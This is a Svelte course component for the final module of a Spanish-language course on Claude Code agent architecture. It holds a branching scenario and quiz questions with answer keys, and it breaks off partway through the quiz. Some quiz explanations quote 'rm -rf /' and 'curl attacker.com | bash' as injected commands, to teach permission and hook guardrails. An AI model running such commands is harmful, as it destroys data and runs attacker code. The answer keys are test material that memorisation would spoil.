<script lang="ts">
  import { courseStore, allBadges } from '$lib/stores/course';
  import { modules } from '$lib/data/modules';
  import { browser } from '$app/environment';
  import Quiz from '$lib/components/Quiz.svelte';
  import BranchingScenario from '$lib/components/BranchingScenario.svelte';
  import Timer from '$lib/components/Timer.svelte';
  import ModuleNav from '$lib/components/ModuleNav.svelte';
  import SourcesSection from '$lib/components/SourcesSection.svelte';
  import VocabularyFloat from '$lib/components/VocabularyFloat.svelte';
  import BadgeNotification from '$lib/components/BadgeNotification.svelte';
  import type { Badge } from '$lib/stores/course';

  const MODULE_ID = 13;
  const mod = modules.find(m => m.id === MODULE_ID)!;

  let completed = $state(false);
  let showBadge = $state(false);
  let earnedBadge = $state<Badge | null>(null);
  let badgeQueue = $state<Badge[]>([]);

  let showScenario = $state(false);
  let scenarioDone = $state(false);
  let quizDone = $state(false);
  let timedOut = $state(false);

  let scenarioScore = $state(0);
  let scenarioMax = $state(0);
  let quizScore = $state(0);
  let quizMax = $state(0);

  courseStore.startModule(MODULE_ID);

  function handleTimeUp() {
    timedOut = true;
  }

  function handleScenarioComplete(score: number, maxScore: number) {
    let finalScore = score;
    if (timedOut) {
      finalScore = Math.max(0, score - 3);
    }
    scenarioScore = finalScore;
    scenarioMax = maxScore;
    scenarioDone = true;
    checkCompletion();
  }

  function handleQuizComplete(score: number, total: number) {
    quizScore = score;
    quizMax = total;
    quizDone = true;
    checkCompletion();
  }

  function checkCompletion() {
    if (!scenarioDone || !quizDone) return;

    const totalScore = scenarioScore + quizScore;
    const totalMax = scenarioMax + quizMax;

    courseStore.completeModule(MODULE_ID, totalScore, totalMax);
    completed = true;

    // Check if ALL 13 modules are complete for the final badge
    setTimeout(() => {
      const unsub = courseStore.subscribe((state) => {
        const completedModules = Object.entries(state.modules)
          .filter(([_, m]) => m.completed)
          .map(([id]) => Number(id));

        const allDone = Array.from({ length: 13 }, (_, i) => i + 1)
          .every(id => completedModules.includes(id));

        if (allDone) {
          const badge = courseStore.unlockBadge('agent-architect');
          if (badge) {
            badgeQueue = [badge];
            showBadge = true;

            if (browser) {
              import('js-confetti').then(({ default: JSConfetti }) => {
                const confetti = new JSConfetti();
                confetti.addConfetti({
                  emojis: ['\u{1F916}', '\u{1F3C6}', '\u26A1', '\u{1F3AF}', '\u{1F9EC}']
                });
                setTimeout(() => {
                  confetti.addConfetti({
                    emojis: ['\u{1F916}', '\u{1F3C6}', '\u26A1', '\u{1F3AF}', '\u{1F9EC}']
                  });
                }, 1500);
              });
            }
          }
        }
      });
      unsub();
    }, 500);
  }

  function handleBadgeClose() {
    badgeQueue = badgeQueue.slice(1);
    if (badgeQueue.length === 0) {
      showBadge = false;
    }
  }

  // ============================================================
  // MODULE REVIEW DATA
  // ============================================================
  const moduleReview = [
    { id: 1, icon: '\u{1F9EC}', label: 'Agent Loop', concept: 'Observe-Think-Act + 4 componentes core' },
    { id: 2, icon: '\u{1F527}', label: 'Tool Calling + MCP', concept: 'Function calling, JSON Schema, 5 principios' },
    { id: 3, icon: '\u{1F310}', label: 'Ecosistema 2026', concept: 'Claude Code como plataforma agentica' },
    { id: 4, icon: '\u{1F3AF}', label: 'Context Engineering', concept: 'CLAUDE.md, just-in-time, /clear, compaction' },
    { id: 5, icon: '\u{1F4BB}', label: 'Workflow de 4 fases', concept: 'Explore, Plan, Implement, Commit' },
    { id: 6, icon: '\u26A1', label: 'Agent SDK + MCP', concept: 'Construir agentes, Hoofy como caso real' },
    { id: 7, icon: '\u{1F9E0}', label: 'Memoria + Think Tool', concept: '6 niveles, extended thinking, ReAct' },
    { id: 8, icon: '\u{1F52C}', label: 'Hooks + Skills + Sub-agents', concept: '.claude/, 17 eventos, permisos, headless' },
    { id: 9, icon: '\u{1F3AD}', label: 'Multi-Agent + Orquestacion', concept: '5 patrones, Agent Teams, compilador C' },
    { id: 10, icon: '\u{1F6E1}\uFE0F', label: 'Guardrails + Evals', concept: 'Permisos, sandbox, hooks preventivos, pass^k' },
    { id: 11, icon: '\u{1F5A5}\uFE0F', label: 'Workspace + Worktrees', concept: 'Multi-sesion, incident.io, ContextKit' },
    { id: 12, icon: '\u{1F3ED}', label: 'GitHub Actions + Headless', concept: 'CI/CD, harnesses, costos, rainbow deploy' },
  ];

  // ============================================================
  // COMPLEXITY LADDER DATA
  // ============================================================
  const complexityLadder = [
    { level: 1, name: 'Prompt Engineering', desc: 'Un mensaje, una respuesta. Sin herramientas, sin loop.', color: 'text-agent-success', border: 'border-agent-success/30', example: 'Corregir typos, resumir texto, traducir' },
    { level: 2, name: 'Single Agent + Tools', desc: 'Agent loop con herramientas. Observe-think-act autonomo.', color: 'text-agent-accent', border: 'border-agent-accent/30', example: 'Code review basico, refactoring, bug fixing' },
    { level: 3, name: 'Agent + Context Engineering', desc: 'CLAUDE.md, memoria, skills, hooks. Agente configurado profesionalmente.', color: 'text-agent-info', border: 'border-agent-info/30', example: 'Claude Code con reglas de proyecto, MCP servers' },
    { level: 4, name: 'Multi-Agent Orquestado', desc: 'Sub-agents especializados, patrones de orquestacion, Agent Teams.', color: 'text-agent-warning', border: 'border-agent-warning/30', example: 'Pipeline de code review, sistema de research' },
    { level: 5, name: 'Sistema Autonomo en Produccion', desc: 'CI/CD headless, harnesses, evals, costos, rainbow deploys.', color: 'text-agent-danger', border: 'border-agent-danger/30', example: 'GitHub Action con Claude, agentes 24/7' },
  ];

  // ============================================================
  // BRANCHING SCENARIO: TechCorp Code Review System
  // ============================================================
  const scenarioNodes: Record<string, any> = {
    start: {
      id: 'start',
      narrative: 'Eres el nuevo Agent Architect de TechCorp. La empresa tiene 200 developers, 15 repositorios, y genera 200 PRs por dia. El CTO te dice:\n\n"Nuestros code reviews tardan 4-8 horas. Quiero que disebes un sistema basado en Claude Code que haga reviews automaticos en minutos. Necesitamos: analisis de calidad, seguridad, test coverage, y un resumen actionable. Tienes 15 minutos para presentar tu arquitectura."\n\nPrimera decision: la arquitectura base del sistema.',
      choices: [
        { text: 'Una sola instancia de Claude Code que revisa todos los PRs secuencialmente, con un CLAUDE.md completo y todas las reglas en un solo archivo', nextId: 'single_agent_problem', points: 1, feedback: 'Funcional para un equipo pequeno, pero 200 PRs/dia secuencialmente es un cuello de botella critico. Ademas, un CLAUDE.md con reglas de calidad, seguridad, y testing mezcladas genera un contexto enorme que degrada la calidad de cada check individual.' },
        { text: 'Un agente orquestador que despacha PRs a agentes especializados: calidad (Haiku), seguridad (Sonnet), tests (Sonnet), resumen (Sonnet). Ejecucion paralela para los 3 checks.', nextId: 'claude_md_design', points: 5, feedback: 'Excelente. Separacion de responsabilidades con model routing inteligente: Haiku para linting (rapido y barato), Sonnet para tareas que requieren razonamiento (seguridad, tests). Los 3 checks son independientes = ejecucion paralela = 3x mas rapido.' },
        { text: 'Agent Teams de Claude Code: un team lead que asigna PRs a 4 teammates especializados, usando worktrees para aislamiento', nextId: 'claude_md_design', points: 4, feedback: 'Muy buena opcion. Agent Teams de Claude Code maneja la orquestacion nativamente. Los worktrees proporcionan aislamiento de filesystem. Sin embargo, Agent Teams esta optimizado para tareas de desarrollo, no tanto para pipelines de analisis repetitivo.' },
        { text: '10 agentes ultra-especializados: naming conventions, cyclomatic complexity, SQL injection, XSS, dependency vulnerabilities, unit tests, integration tests, coverage, performance, documentation', nextId: 'over_engineering', points: 0, feedback: 'Sobre-ingenieria clasica. 10 agentes significan 10x overhead de coordinacion, 10 system prompts que mantener, y tokens de orquestacion que superan el beneficio. Agrupando por DOMINIO (calidad, seguridad, tests) cubres todo con 4 agentes.' }
      ]
    },
    single_agent_problem: {
      id: 'single_agent_problem',
      narrative: 'Tu agente monolitico procesa 1 PR cada 3-4 minutos. Con 200 PRs/dia (pico de 40/hora), el backlog crece sin control. A las 2 PM ya tienes 80 PRs esperando.\n\nAdemas, el CLAUDE.md tiene 8,000 tokens de reglas mezcladas. El agente confunde reglas de seguridad con reglas de estilo.\n\nNecesitas descomponer. Como lo reestructuras?',
      choices: [
        { text: 'Separar en 4 agentes especializados (calidad, seguridad, tests, resumen) con sus propios CLAUDE.md enfocados, ejecutando en paralelo', nextId: 'claude_md_design', points: 4, feedback: 'Ahora si. Cada agente tiene su propio contexto enfocado. El de seguridad solo carga reglas OWASP, el de calidad solo carga style guides. Contextos pequenos = mejor razonamiento.' },
        { text: 'Mantener 1 agente pero agregar mas herramientas y un CLAUDE.md mejor organizado con secciones', nextId: 'hooks_config', points: 2, feedback: 'Mejor organizacion ayuda, pero no resuelve el problema de escala. Un solo agente con 15+ herramientas tiene peor razonamiento sobre cual usar. Y sigue siendo secuencial.' }
      ]
    },
    over_engineering: {
      id: 'over_engineering',
      narrative: 'Con 10 agentes, tu orquestador necesita un system prompt de 3,000 tokens solo para saber que agente llamar para que. Los costos de coordinacion (tokens del orquestador) representan el 40% del costo total.\n\nCuando el agente de "naming conventions" encuentra un problema, no sabe si es tambien un problema de "cyclomatic complexity" porque son dominios separados artificialmente.\n\nSimplifica tu diseno.',
      choices: [
        { text: 'Consolidar en 4 agentes por DOMINIO: calidad (linting + complexity + naming), seguridad (OWASP + deps + secrets), tests (runner + coverage), resumen', nextId: 'claude_md_design', points: 4, feedback: 'Correcto. La granularidad correcta es por DOMINIO de conocimiento, no por check individual. Un agente de "calidad" entiende que naming, complexity, y patterns estan interrelacionados.' },
        { text: 'Reducir a 6 agentes eliminando los menos importantes', nextId: 'claude_md_design', points: 2, feedback: 'Menos es mejor, pero 6 sigue siendo mas de lo necesario para este problema. El sweet spot para code review es 4 dominios: calidad, seguridad, tests, y sintesis.' }
      ]
    },
    claude_md_design: {
      id: 'claude_md_design',
      narrative: 'Tienes tu arquitectura de agentes definida. Ahora necesitas configurar el CLAUDE.md del proyecto y las reglas de cada agente.\n\nRecuerda: context engineering es el arte de dar al agente EXACTAMENTE la informacion que necesita, ni mas ni menos. El CTO te pregunta: "Como organizas las instrucciones?"',
      choices: [
        { text: 'Un CLAUDE.md global con principios de alto nivel (50 lineas) + archivos .claude/rules/ por dominio que se cargan con just-in-time context segun el agente que se activa', nextId: 'hooks_config', points: 5, feedback: 'Perfecto. Es el patron de 6 capas de CLAUDE.md: el archivo principal tiene principios generales, y los .claude/rules/ se cargan solo cuando son relevantes. El agente de seguridad carga security-rules.md, el de calidad carga quality-rules.md. Just-in-time = contexto minimo = mejor razonamiento.' },
        { text: 'Cada agente con su propio CLAUDE.md completo e independiente (500+ lineas cada uno), sin archivo global compartido', nextId: 'hooks_config', points: 2, feedback: 'Funcional pero tiene problemas: (1) Duplicacion de reglas comunes (estilo de commits, formato de output). (2) Si cambias una regla global, debes actualizar 4 archivos. (3) 500 lineas de contexto permanente reducen la ventana disponible para el analisis del PR.' },
        { text: 'Todo en un solo CLAUDE.md maestro de 2,000 lineas que todos los agentes comparten', nextId: 'hooks_config', points: 1, feedback: 'Peligroso. 2,000 lineas de contexto permanente significa que cada agente gasta tokens leyendo reglas irrelevantes. El agente de tests no necesita las reglas OWASP. Ademas, con la regla del 60%, ese CLAUDE.md consumiria la mitad del context window.' },
        { text: 'Sin CLAUDE.md: las instrucciones van directamente en el system prompt de cada agente via API', nextId: 'hooks_config', points: 1, feedback: 'Funciona tecnicamente pero pierdes la ventaja principal de CLAUDE.md: persistencia y versionado en Git. Ademas, los system prompts via API no se benefician de la jerarquia de 6 capas que Claude Code soporta. Las instrucciones deberian vivir en el repo, no en codigo de orquestacion.' }
      ]
    },
    hooks_config: {
      id: 'hooks_config',
      narrative: 'El sistema esta tomando forma. Ahora necesitas hooks para control y observabilidad. Los hooks de Claude Code interceptan eventos del agente: PreToolUse (antes de usar una herramienta), PostToolUse (despues), Notification (alertas), Stop (al terminar).\n\nTu sistema va a COMENTAR en PRs de produccion. Un error puede bloquear un deploy critico o dejar pasar una vulnerabilidad.\n\nQue hooks configuras?',
      choices: [
        { text: 'PreToolUse: validar que el agente solo use tools permitidas (deny Write/Edit). PostToolUse: loggear cada accion con timestamp y tokens. Notification: alertar a Slack si confidence < 70%. Stop: generar resumen estructurado JSON.', nextId: 'cost_management', points: 5, feedback: 'Completo y bien pensado. PreToolUse como guardrail preventivo (el agente NO puede modificar codigo, solo leer). PostToolUse para auditing. Notification para alertas de baja confianza. Stop para asegurar output estructurado. Las 4 capas de hooks cubren prevencion, logging, alerting, y formato.' },
        { text: 'Solo PostToolUse para loggear acciones y Notification para errores criticos', nextId: 'cost_management', points: 3, feedback: 'Logging y alertas son buenos, pero sin PreToolUse no tienes guardrails PREVENTIVOS. El agente podria intentar ejecutar bash rm -rf o editar archivos del repo. PostToolUse loggea lo que ya paso; PreToolUse lo PREVIENE.' },
        { text: 'Ningun hook. Mantener la configuracion simple y confiar en los permisos de Claude Code (allow/deny)', nextId: 'cost_management', points: 1, feedback: 'Los permisos de Claude Code son la primera linea de defensa, pero no son suficientes para produccion. Sin hooks no tienes logging de acciones, no tienes alertas, y no puedes customizar el comportamiento. Los hooks son la diferencia entre "funciona" y "funciona de forma observable y controlable".' },
        { text: 'PreToolUse para bloquear TODAS las herramientas excepto Read y Glob. Sin PostToolUse ni otros hooks.', nextId: 'cost_management', points: 2, feedback: 'Demasiado restrictivo. Si el agente solo puede leer (Read, Glob), no puede ejecutar tests (necesita Bash), no puede postear comentarios (necesita WebFetch o una tool custom). Los permisos deben ser proporcionales: permitir lo necesario, denegar lo peligroso.' }
      ]
    },
    cost_management: {
      id: 'cost_management',
      narrative: 'El CFO entra a la reunion: "Cuanto va a costar esto?" Con 200 PRs/dia, cada decision de modelo impacta directamente el presupuesto mensual.\n\nDatos de referencia:\n- Claude Opus: ~$0.60 por PR (alta calidad, lento)\n- Claude Sonnet: ~$0.12 por PR (buena calidad, rapido)\n- Claude Haiku: ~$0.02 por PR (calidad basica, muy rapido)\n\nCon 200 PRs/dia x 30 dias = 6,000 PRs/mes.\n\nComo gestionas los costos?',
      choices: [
        { text: 'Model routing inteligente: Haiku para linting ($0.02), Sonnet para seguridad y tests ($0.12 c/u), Sonnet para resumen ($0.12). Total por PR: ~$0.38. Mas: token budgets por agente, /clear entre PRs, y batch API para PRs de baja prioridad (50% descuento).', nextId: 'eval_strategy', points: 5, feedback: 'Optimo. El model routing asigna el modelo correcto al nivel de complejidad: Haiku es suficiente para linting (tareas deterministas), Sonnet para razonamiento (seguridad, tests). Batch API para PRs no urgentes ahorra 50%. Costo mensual estimado: ~$2,280 ($0.38 x 6K) sin batch, ~$1,500 con batch para PRs de baja prioridad.' },
        { text: 'Usar Opus para todo: la calidad es lo mas importante en code review', nextId: 'eval_strategy', points: 1, feedback: 'A $0.60 por PR x 4 agentes = $2.40 por PR x 6,000 PRs/mes = $14,400/mes. Para code review automatizado, Opus es overkill en la mayoria de checks. Linting no necesita Opus. Solo findings complejos de seguridad justificarian Opus, y esos son el 5% de los PRs.' },
        { text: 'Usar Haiku para todo: minimizar costos al maximo', nextId: 'eval_strategy', points: 1, feedback: 'A $0.02 por PR x 4 agentes = $0.08 por PR = $480/mes. Barato, pero Haiku no tiene la capacidad de razonamiento para detectar vulnerabilidades sutiles de seguridad o analizar test coverage de forma inteligente. Ahorras dinero pero produces reviews de baja calidad que los developers ignoran.' },
        { text: 'Sonnet para todo: balance de calidad y costo', nextId: 'eval_strategy', points: 3, feedback: 'Razonable y simple. $0.12 x 4 agentes = $0.48 por PR = $2,880/mes. Funciona bien, pero desperdicias dinero en linting (Haiku es suficiente) y pierdes oportunidad de usar batch API. El model routing optimizado ahorraria ~40%.' }
      ]
    },
    eval_strategy: {
      id: 'eval_strategy',
      narrative: 'El sistema lleva 2 semanas en produccion. El VP de Engineering pregunta: "Como sabemos que los reviews del agente son buenos? Tenemos datos que respalden que no estamos publicando basura?"\n\nNecesitas una estrategia de evaluacion. Como la disenas?',
      choices: [
        { text: 'Golden dataset de 50 PRs con reviews humanos de referencia. Correr pass^k (k=3): el sistema pasa solo si las 3 ejecuciones son correctas. Human spot checks del 10% diario. Dashboard con precision, recall, falsos positivos, developer satisfaction (thumbs up/down en cada review).', nextId: 'failure_scenario', points: 5, feedback: 'Evaluacion de nivel enterprise. Golden dataset + pass^k detecta tanto errores puntuales como inconsistencia (si de 3 ejecuciones solo 2 son correctas, hay un problema de reliability). Human spot checks validan en produccion real. Metricas de satisfaccion capturan lo que las metricas tecnicas no: si los developers CONFIAN en los reviews.' },
        { text: 'Verificar manualmente un sample del 10% de reviews cada semana y trackear falsos positivos', nextId: 'failure_scenario', points: 3, feedback: 'Buen punto de partida pero solo reactivo. Sin golden dataset, no tienes un benchmark para detectar REGRESIONES. Si actualizas el system prompt y la calidad baja, no lo sabes hasta que un developer se queja. El spot check manual es complementario, no suficiente.' },
        { text: 'Confiar en que Claude Sonnet es suficientemente bueno. Si los developers se quejan, ajustamos.', nextId: 'failure_scenario', points: 0, feedback: 'Inaceptable para produccion. "Confiar sin verificar" es el anti-patron mas peligroso en sistemas de IA. Los LLMs son no-deterministas: el mismo PR puede recibir reviews diferentes en ejecuciones distintas. Sin evaluacion, no tienes forma de saber si el sistema funciona, y te enteras de los problemas por quejas (demasiado tarde).' },
        { text: 'A/B testing: 50% de PRs con review del agente, 50% con review humano, comparar metricas de defect escape rate despues de merge', nextId: 'failure_scenario', points: 4, feedback: 'Metodologicamente riguroso. Comparar defect escape rate mide el impacto REAL del agente vs humanos. Sin embargo, tarda semanas en generar datos significativos, y mientras tanto no sabes si el 50% con agente esta dejando pasar bugs. Complementa con golden dataset para feedback inmediato.' }
      ]
    },
    failure_scenario: {
      id: 'failure_scenario',
      narrative: 'Lunes 9 AM. Alerta critica: el agente de seguridad no puede conectarse al servicio de dependency scanning (Snyk). Hay 35 PRs en cola esperando review completo. El equipo de seguridad pregunta: "Los PRs que se revisaron esta manana, tuvieron scan de dependencias?"\n\nComo respondes al incidente?',
      choices: [
        { text: 'Fallback chain: activar scan local con base de datos de CVEs cached (actualizada diariamente). Marcar todos los reviews como "parcial - sin scan live de dependencias". Alertar al equipo de seguridad para review manual de PRs con cambios en package.json/requirements.txt. Postmortem al final del dia.', nextId: 'final_decision', points: 5, feedback: 'Degradacion graceful perfecta. El sistema no se detiene: usa datos cached (no tan frescos pero funcionales). Transparencia total: los reviews se marcan como parciales. Escalacion inteligente: solo PRs con cambios de dependencias van a review humano (no todos). Postmortem para evitar que se repita.' },
        { text: 'Detener todos los reviews hasta que Snyk vuelva a estar disponible. Mejor seguro que rapido.', nextId: 'final_decision', points: 1, feedback: 'Over-reaction. Los checks de calidad y tests NO dependen de Snyk. Solo el scan de dependencias esta afectado. Detener TODO porque un componente fallo bloquea a 200 developers innecesariamente. El principio de aislamiento de fallos: un componente no deberia tumbar el sistema completo.' },
        { text: 'Continuar los reviews sin el check de seguridad. Los developers pueden mergear y haremos el scan despues.', nextId: 'final_decision', points: 1, feedback: 'Riesgoso. PRs sin scan de seguridad pueden introducir dependencias vulnerables. Mergear primero y escanear despues invierte el orden de seguridad: es mas dificil (y costoso) arreglar vulnerabilidades despues del merge que antes. Al menos marca los reviews como incompletos.' },
        { text: 'Retry automatico cada 60 segundos. Mientras, acumular PRs en una cola. Cuando Snyk vuelva, procesar el backlog.', nextId: 'final_decision', points: 2, feedback: 'El retry es correcto como primera accion, pero sin fallback los PRs se acumulan indefinidamente. Si Snyk esta caido 3 horas, tienes 120+ PRs bloqueados. Necesitas un plan B que no dependa de la recuperacion del servicio externo.' }
      ]
    },
    final_decision: {
      id: 'final_decision',
      narrative: 'Ultima decision. Es viernes por la tarde. Un developer senior abre un PR marcado como "URGENT - hotfix for production". El agente de seguridad detecta un posible path traversal vulnerability con confidence 72%. El PR necesita llegar a produccion AHORA.\n\nEl developer dice: "Es un falso positivo, yo se lo que hago." Tu sistema tiene que decidir.',
      choices: [
        { text: 'Escalar a un humano del equipo de seguridad con contexto completo: el codigo, el finding, el confidence score, y la urgencia del hotfix. Dejar que el humano decida si bloquear o aprobar. Mientras, dejar pasar los otros checks (calidad y tests).', nextId: 'outcome_excellent', points: 5, feedback: 'Decision de Agent Architect. Para findings de seguridad con impacto potencial alto (path traversal = acceso a archivos del servidor), la decision no debe ser automatica. Escalar con contexto permite al humano decidir rapido. Los otros checks no bloquean porque no tienen findings criticos. Autonomia proporcional al riesgo.' },
        { text: 'Bloquear el PR automaticamente. La politica es clara: findings de seguridad = bloqueo hasta review humano.', nextId: 'outcome_good', points: 3, feedback: 'Seguro pero rigido. Bloquear un hotfix de produccion puede causar mas dano que el finding con 72% de confidence. La politica de "bloquear siempre" no distingue entre un typo y un incidente de produccion. Un buen sistema ajusta su respuesta al contexto (urgencia + impacto + confidence).' },
        { text: 'Dejar pasar el PR. El developer es senior, dice que es falso positivo, y es un hotfix urgente. La confianza en el equipo es importante.', nextId: 'outcome_needs_work', points: 1, feedback: 'Peligroso. El 28% de probabilidad de que sea una vulnerabilidad real no desaparece porque un developer diga que es falso positivo. Path traversal en produccion puede exponer archivos del servidor. La urgencia no justifica saltarse la revision de seguridad; justifica ACELERAR la revision humana.' },
        { text: 'Agregar un comentario automatico en el PR advirtiendo del finding pero sin bloquear, y registrar que el developer eligio ignorar la advertencia.', nextId: 'outcome_good', points: 3, feedback: 'Pragmatico. El agente informa pero no bloquea. El registro crea accountability. Sin embargo, para un finding de seguridad potencialmente critico (path traversal), depender de que el developer lea y actue correctamente es delegar la responsabilidad. Un equipo de seguridad deberia ser notificado para findings de este nivel.' }
      ]
    },
    outcome_excellent: {
      id: 'outcome_excellent',
      narrative: '',
      outcome: {
        title: 'Arquitecto Senior de Agentes',
        description: 'Disenaste un sistema de code review multi-agente production-ready: agentes especializados con model routing, context engineering con CLAUDE.md jerarquico, hooks multicapa, gestion de costos inteligente, evaluacion rigurosa, manejo de fallos graceful, y escalacion humana proporcional al riesgo. Este es el nivel que distingue a un Agent Architect de un usuario avanzado.',
        score: 30,
        maxScore: 30,
        grade: 'excellent',
        lessons: [
          'Agentes especializados por DOMINIO + model routing = calidad + eficiencia de costos.',
          'CLAUDE.md jerarquico con .claude/rules/ y just-in-time context = contexto minimo, maximo razonamiento.',
          'Hooks en 4 capas: PreToolUse (prevencion), PostToolUse (auditing), Notification (alertas), Stop (formato).',
          'Golden dataset + pass^k + human spot checks + satisfaction metrics = evaluacion completa.',
          'Fallback chains con degradacion graceful: el sistema sigue funcionando cuando un componente falla.',
          'Escalacion humana proporcional: alto impacto + baja confianza = siempre escalar con contexto.'
        ]
      }
    },
    outcome_good: {
      id: 'outcome_good',
      narrative: '',
      outcome: {
        title: 'Arquitecto Junior de Agentes',
        description: 'Tu arquitectura tiene fundamentos solidos: entiendes la separacion de agentes, la importancia de los hooks, y la gestion de costos. Algunos aspectos de evaluacion, manejo de fallos, o escalacion podrian refinarse para un sistema verdaderamente production-ready.',
        score: 20,
        maxScore: 30,
        grade: 'good',
        lessons: [
          'La especializacion de agentes es correcta. Revisa si el model routing esta optimizado.',
          'Los hooks son esenciales: PreToolUse para prevencion, PostToolUse para auditoria.',
          'La evaluacion necesita golden datasets + metricas cuantitativas, no solo spot checks manuales.',
          'Ante fallos de servicios externos, siempre ten un fallback local + transparencia con el usuario.',
          'Para findings de seguridad criticos, escalar a humanos con contexto es mas seguro que decidir automaticamente.'
        ]
      }
    },
    outcome_needs_work: {
      id: 'outcome_needs_work',
      narrative: '',
      outcome: {
        title: 'Arquitecto en Entrenamiento',
        description: 'Tu diseno tiene gaps significativos en areas criticas como seguridad, evaluacion, o manejo de fallos. Revisa los modulos 4 (Context Engineering), 8 (Hooks y Permisos), y 10 (Guardrails y Evals) antes de disenar sistemas para produccion.',
        score: 12,
        maxScore: 30,
        grade: 'needs-work',
        lessons: [
          'Evita agentes monoliticos: la separacion de responsabilidades aplica tambien a agentes IA.',
          'El CLAUDE.md debe ser jerarquico: principios globales + reglas especificas por dominio.',
          'Los hooks no son opcionales en produccion: son la base de seguridad y observabilidad.',
          'Sin evaluacion cuantitativa, no sabes si tu sistema funciona o produce basura con confianza.',
          'La urgencia no justifica saltarse la seguridad; justifica acelerar el proceso de revision.'
        ]
      }
    },
    outcome_critical: {
      id: 'outcome_critical',
      narrative: '',
      outcome: {
        title: 'Revisar Fundamentos',
        description: 'Tu arquitectura tiene vulnerabilidades fundamentales que causarian fallos criticos en produccion. Revisa los modulos 1-4 para reforzar los conceptos basicos de agentes, herramientas, y context engineering.',
        score: 4,
        maxScore: 30,
        grade: 'critical',
        lessons: [
          'Un agente monolitico con muchas herramientas razona peor que agentes especializados con pocas.',
          'Sin context engineering (CLAUDE.md), el agente no tiene reglas claras y produce output inconsistente.',
          'Sin hooks, no tienes control ni visibilidad sobre lo que el agente hace.',
          'Sin evaluacion, confias ciegamente en output no determinista.',
          'Sin fallback chains, un fallo parcial tumba todo el sistema.',
          'Las decisiones de seguridad NUNCA se delegan al agente para findings criticos.'
        ]
      }
    }
  };

  // ============================================================
  // QUIZ: 5 Synthesis Questions (multi-module)
  // ============================================================
  const quizQuestions = [
    {
      question: 'Estas configurando Claude Code para un monorepo con 3 servicios (API, Frontend, Workers). Quieres que cada servicio tenga sus propias reglas, pero tambien compartir reglas globales de estilo. Cual es la MEJOR estrategia de context engineering?',
      options: [
        { text: 'Un CLAUDE.md raiz con reglas globales (estilo, commits) + un .claude/rules/ por servicio que se carga con just-in-time context segun el directorio de trabajo', correct: true, explanation: 'Correcto. El CLAUDE.md raiz define reglas universales (50-100 lineas). Los .claude/rules/ por servicio cargan reglas especificas solo cuando el agente trabaja en ese directorio. Es el patron de jerarquia de 6 capas aplicado a un monorepo. Combina modulos 4 (context engineering) y 8 (estructura .claude/).' },
        { text: 'Tres CLAUDE.md separados (uno por servicio), cada uno con todas las reglas incluyendo las globales duplicadas', correct: false, explanation: 'Duplicacion de reglas = inconsistencia cuando actualizas una regla global en un servicio pero no en los otros. Viola DRY aplicado a context engineering.' },
        { text: 'Un solo CLAUDE.md enorme con secciones para cada servicio, marcadas con headers', correct: false, explanation: 'Carga contexto innecesario permanentemente. Si trabajas en el Frontend, no necesitas las reglas del API Workers en memoria. Desperdicia tokens del context window.' },
        { text: 'Sin CLAUDE.md. Usar skills con SKILL.md por servicio que contienen todas las instrucciones', correct: false, explanation: 'Las skills son para conocimiento reutilizable entre proyectos, no para reglas de proyecto. CLAUDE.md es el lugar correcto para reglas que son especificas de este repositorio.' }
      ],
      source: 'Claude Code - Memory + Skills',
      sourceUrl: 'https://code.claude.com/docs/en/memory'
    },
    {
      question: 'Tu sistema multi-agente tiene un agente orquestador que despacha tareas a 3 sub-agents. Un sub-agent necesita ejecutar "npm test" como parte del code review. Cual es la configuracion de permisos y hooks MAS SEGURA que permite esto?',
      options: [
        { text: 'Allow Bash(npm test) en el sub-agent de tests. Deny Bash(*) para los otros sub-agents. PreToolUse hook que valida el comando contra una allowlist regex antes de ejecucion.', correct: true, explanation: 'Defensa en profundidad: permisos granulares (solo npm test) + hook preventivo como segunda capa. Si algun prompt injection intenta ejecutar "npm test && rm -rf /", el hook regex lo bloquea. Combina modulos 8 (permisos), 10 (guardrails con hooks), y 9 (aislamiento de sub-agents).' },
        { text: 'Allow Bash(*) para todos los agentes para flexibilidad maxima, con un PostToolUse hook que loggea todo', correct: false, explanation: 'PostToolUse loggea DESPUES de la ejecucion. Si el agente ejecuta "rm -rf /", el log dice "rm -rf / ejecutado" pero el dano ya esta hecho. Logging no es prevencion.' },
        { text: 'Deny Bash(*) para todos los agentes. Crear una tool custom "run_tests" que internamente ejecuta npm test', correct: false, explanation: 'Funciona pero es innecesariamente complejo. Claude Code ya tiene el sistema de permisos granulares con allowlists. Crear tools custom para wrappear comandos basicos agrega complejidad de mantenimiento sin beneficio real.' },
        { text: 'Allow Bash(*) solo para el sub-agent de tests, sin hooks adicionales. La separacion de agentes ya provee aislamiento.', correct: false, explanation: 'Allow Bash(*) permite CUALQUIER comando, no solo npm test. Un prompt injection podria ejecutar "curl attacker.com | bash". La separacion de agentes ayuda pero no es suficiente: necesitas permisos granulares + hooks preventivos.' }
      ],
      source: 'Claude Code - Permissions + Hooks',
      sourceUrl: 'https://code.claude.com/docs/en/permissions'
    },
    {
      question: 'Tu pipeline de Claude Code en GitHub Actions procesa 200 PRs/dia. El costo mensual actual es $4,500. El CFO pide reducirlo a $2,000 sin perder calidad en findings criticos de seguridad. Cual es la estrategia OPTIMA?',
      options: [
        { text: 'Cambiar todos los agentes a Haiku: el mas barato disponible', correct: false, explanation: 'Haiku no tiene la capacidad de razonamiento para detectar vulnerabilidades sutiles. Ahorras dinero pero produces reviews de baja calidad. Los developers dejarian de confiar en el sistema en 2 semanas.' },
        { text: 'Model routing: Haiku para linting, Sonnet para seguridad y tests. Batch API (50% ahorro) para PRs de branches de feature (no urgentes). Token budget de 8K por agente. /clear entre PRs para no acumular contexto.', correct: true, explanation: 'Optimizacion multi-nivel: (1) Model routing ahorra ~40% vs Sonnet para todo. (2) Batch API ahorra 50% en PRs no urgentes (~60% del volumen). (3) Token budgets previenen PRs "caros" que se descontrolan. (4) /clear evita context acumulado que desperdicia tokens. Costo estimado: ~$1,800/mes. Combina modulos 12 (GitHub Actions, costos) y 5 (workflow, /clear).' },
        { text: 'Procesar solo PRs que tocan archivos criticos (src/, security/). Ignorar PRs de docs, configs, y tests.', correct: false, explanation: 'Ahorras reviews pero pierdes cobertura. Un cambio en .github/workflows/ o docker-compose.yml puede introducir vulnerabilidades de seguridad. La seleccion de que PRs revisar deberia basarse en riesgo, no en directorio.' },
        { text: 'Reducir la frecuencia: revisar solo 1 de cada 3 PRs seleccionados aleatoriamente', correct: false, explanation: 'Dejar 2 de cada 3 PRs sin review es inaceptable para seguridad. La vulnerabilidad podria estar en cualquiera de los PRs no revisados. El ahorro de costos no justifica la perdida de cobertura de seguridad.' }
      ],
      source: 'Claude Code - Cost Management',
